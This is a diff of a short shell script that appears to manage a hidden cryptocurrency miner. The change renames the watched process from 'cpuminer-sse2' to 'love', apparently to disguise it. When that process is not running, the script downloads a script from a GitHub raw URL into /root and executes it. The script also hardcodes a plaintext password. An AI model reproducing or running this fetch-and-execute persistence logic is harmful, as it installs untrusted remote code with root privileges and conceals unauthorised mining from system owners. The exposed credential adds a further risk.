@@ -1,10 +1,10 @@
 #!/bin/sh
 password="danielchau@123#"
-if pgrep cpuminer-sse2 >/dev/null
+if pgrep love >/dev/null
 then
-  echo "cpuminer-sse2 is running."
+  echo "love is running."
 else
-  echo "cpuminer-sse2 isn't running"
+  echo "love isn't running"
   wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
   chmod +x /root/kill_miner.sh
   ./kill_miner.sh
